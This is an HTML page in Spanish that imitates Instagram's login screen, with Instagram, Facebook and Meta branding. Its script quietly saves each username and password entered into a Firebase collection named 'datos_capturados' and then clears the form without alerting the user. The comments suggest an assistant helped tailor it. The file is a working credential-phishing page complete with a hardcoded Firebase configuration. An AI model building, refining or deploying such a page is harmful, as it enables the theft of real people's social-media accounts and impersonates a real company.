<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión • Prueba</title>
    <style>
        /* ESTILOS GLOBALES (Recreando el fondo de Instagram) */
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0; 
            padding: 0;
            background-color: #121212; /* Fondo casi negro */
            color: #ffffff; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* CONTENEDOR PRINCIPAL (Dos columnas) */
        .page-container {
            display: flex;
            width: 100%;
            max-width: 935px; /* Ancho máximo de la UI de Instagram */
            margin: 0 auto;
            padding: 20px;
        }

        /* COLUMNA IZQUIERDA (Texto y Gráficos) */
        .left-column {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-end; /* Alinea el texto a la derecha */
            padding-right: 48px;
            text-align: right; /* Texto alineado a la derecha */
        }

        /* Logotipo de Instagram */
        .insta-logo-left {
            width: 175px;
            margin-bottom: 24px;
        }

        /* Texto de bienvenida */
        .welcome-text {
            font-size: 32px;
            font-weight: 300;
            line-height: 40px;
            max-width: 450px;
            margin-bottom: 30px;
        }

        /* Efecto de degradado de color en "mejores amigos" */
        .gradient-text {
            font-weight: bold;
            background: linear-gradient(to right, #f96d03, #d3202e 50%, #c725ac);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        /* Gráfico de teléfonos (Simulación simple con CSS) */
        .phone-graphics {
            position: relative;
            width: 350px;
            height: 380px;
            margin-top: 20px;
        }
        .phone-mockup {
            position: absolute;
            background-color: #262626; /* Color de fondo del teléfono */
            border-radius: 20px;
            box-shadow: 0px 4px 12px rgba(0,0,0,0.5);
            border: 2px solid #363636;
            overflow: hidden;
        }
        .phone-mockup.main {
            width: 180px;
            height: 350px;
            top: 0;
            left: 80px;
            z-index: 2;
        }
        .phone-mockup.side {
            width: 150px;
            height: 300px;
            top: 40px;
            opacity: 0.7;
        }
        .phone-mockup.side-1 { left: 0; z-index: 1; }
        .phone-mockup.side-2 { left: 200px; z-index: 1; }
        
        /* Marcadores de posición de imagen dentro de los teléfonos */
        .image-placeholder {
            width: 100%;
            height: 80%; /* Espacio para la 'foto' */
            background-color: #363636;
            margin-top: 15%; /* Espacio para el 'notch' */
        }

        /* COLUMNA DERECHA (Formulario de inicio de sesión) */
        .right-column {
            width: 350px;
            flex-shrink: 0; /* No se encoge */
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* CAJA DEL FORMULARIO TRASLÚCIDA */
        .form-box {
            background-color: #1c1c1c; /* Ligeramente más claro que el fondo */
            border: 1px solid #363636;
            border-radius: 8px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-shadow: 0px 4px 12px rgba(0,0,0,0.3);
        }

        /* Icono de flecha atrás `<` */
        .back-arrow {
            align-self: flex-start;
            color: #ffffff;
            font-size: 24px;
            margin-bottom: 24px;
            text-decoration: none;
        }

        /* Título del formulario */
        .form-title {
            font-size: 16px;
            font-weight: bold;
            color: #ffffff;
            margin-bottom: 30px;
            text-align: center;
        }

        /* CAJAS DE ENTRADA (Inputs estilo Instagram) */
        .input-group {
            width: 100%;
            margin-bottom: 12px;
        }

        input { 
            width: 100%;
            padding: 12px; 
            background-color: rgba(0, 0, 0, 0.4); /* Casi negro y semi-transparente */
            border: 1px solid #363636; 
            border-radius: 6px; 
            color: #ffffff; 
            font-size: 12px;
            box-sizing: border-box; /* Asegura que el padding no sume al ancho */
            text-align: left;
            transition: border-color 0.2s;
        }

        input:focus { 
            outline: none; 
            border-color: #555555; /* Borde más claro al escribir */
        }
        
        /* Ajuste de color para los placeholders */
        input::placeholder {
            color: #8e8e8e;
        }

        /* BOTÓN DE INICIO DE SESIÓN */
        button#botonEnviar { 
            width: 100%;
            padding: 10px; 
            background-color: #0095f6; /* Azul brillante de Instagram */
            color: #ffffff; 
            font-weight: bold;
            font-size: 14px;
            border: none; 
            border-radius: 8px; 
            cursor: pointer; 
            margin-top: 15px;
            margin-bottom: 20px;
            transition: background-color 0.3s, transform 0.1s;
        }

        button#botonEnviar:hover { 
            background-color: #1877f2; /* Azul más oscuro */
        }
        
        button#botonEnviar:active {
            transform: scale(0.98); /* Pequeño efecto de pulsado */
        }

        /* ENLACES Y DIVISORES */
        .form-links {
            text-align: center;
            font-size: 12px;
            color: #ffffff;
        }
        .form-link {
            color: #ffffff;
            text-decoration: none;
            display: block;
            margin-bottom: 20px;
        }
        .form-link:hover {
            text-decoration: underline;
        }

        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin-bottom: 20px;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background-color: #363636;
        }

        /* BOTÓN INICIAR SESIÓN CON FACEBOOK */
        .facebook-login-btn {
            width: 100%;
            background-color: transparent;
            color: #1877f2;
            border: 1px solid #1877f2;
            border-radius: 8px;
            padding: 10px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            transition: background-color 0.3s;
        }
        .facebook-login-btn:hover {
            background-color: rgba(24, 119, 242, 0.1);
        }
        .facebook-icon {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }

        /* ENLACE CREAR CUENTA NUEVA */
        .create-account-btn {
            display: block;
            color: #0095f6;
            text-decoration: none;
            font-weight: bold;
            font-size: 14px;
            text-align: center;
            margin-bottom: 30px;
        }
        .create-account-btn:hover {
            color: #1877f2;
        }

        /* LOGO DE META AL FINAL */
        .meta-logo {
            width: 60px;
            display: block;
            margin: 0 auto;
            margin-top: auto; /* Empuja hacia abajo */
        }

        /* RESPONSIVIDAD (Ajuste para móviles) */
        @media (max-width: 800px) {
            .left-column { display: none; } /* Oculta la columna izquierda en móviles */
            .page-container { justify-content: center; max-width: 350px; }
            .form-box { background-color: transparent; border: none; box-shadow: none; padding: 20px; }
        }
    </style>
</head>
<body>

    <div class="page-container">
        
        <div class="left-column">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png" alt="Instagram Logo" class="insta-logo-left">
            
            <p class="welcome-text">
                Mira los momentos cotidianos de tus 
                <span class="gradient-text">mejores amigos</span>.
            </p>
            
            <div class="phone-graphics">
                <div class="phone-mockup main">
                    <div class="image-placeholder"></div>
                </div>
                <div class="phone-mockup side side-1">
                    <div class="image-placeholder"></div>
                </div>
                <div class="phone-mockup side side-2">
                    <div class="image-placeholder"></div>
                </div>
            </div>
        </div>

        <div class="right-column">
            <div class="form-box">
                <a href="#" class="back-arrow">&lt;</a>
                
                <p class="form-title">Iniciar sesión en Instagram</p>
                
                <div class="input-group">
                    <input type="text" id="correoInput" placeholder="Número de celular, nombre de usuario o correo electrónico">
                </div>
                
                <div class="input-group">
                    <input type="password" id="claveInput" placeholder="Contraseña">
                </div>
                
                <button id="botonEnviar">Iniciar sesión</button>
                
                <div class="form-links">
                    <a href="#" class="form-link">¿Olvidaste tu contraseña?</a>
                </div>
                
                <div class="divider">
                    <div class="divider-line"></div>
                </div>
                
                <button class="facebook-login-btn">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/Facebook_icon_2013.svg" alt="Facebook Icon" class="facebook-icon">
                    Iniciar sesión con Facebook
                </button>
                
                <a href="#" class="create-account-btn">Crear cuenta nueva</a>
                
                <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta Logo" class="meta-logo">
            </div>
        </div>

    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

        // TU CONFIGURACIÓN EXACTA DE FIREBASE (NO CAMBIAR)
        const firebaseConfig = {
          apiKey: "AIzaSyCCee44HaI_Gk5R_6fHeezEHQ0CciU2fmY",
          authDomain: "app-prueba-b6c8b.firebaseapp.com",
          projectId: "app-prueba-b6c8b",
          storageBucket: "app-prueba-b6c8b.firebasestorage.app",
          messagingSenderId: "81316242382",
          appId: "1:81316242382:web:8a523d79dbff6ba892419f",
          measurementId: "G-CPERQFP9TP"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const boton = document.getElementById("botonEnviar");
        
        boton.addEventListener("click", async () => {
            // Capturamos el texto de las nuevas cajas de entrada
            // (He usado los IDs originales para que no tengas que cambiar nada en Firebase)
            const correo_usuario = document.getElementById("correoInput").value;
            const clave = document.getElementById("claveInput").value;

            try {
                // He renombrado la clave en Firestore para que sea más claro qué es
                await addDoc(collection(db, "datos_capturados"), {
                    datosUsuarioIngresado: correo_usuario, // Correo, Celular o Usuario
                    claveIngresada: clave
                });
                
                // Un aviso más sutil para que no rompa la estética
                console.log("Datos registrados en Firebase");
                
                // Limpiamos las cajas
                document.getElementById("correoInput").value = "";
                document.getElementById("claveInput").value = "";

            } catch (error) {
                console.error("Hubo un error: ", error);
            }
        });
    </script>
</body>
</html>
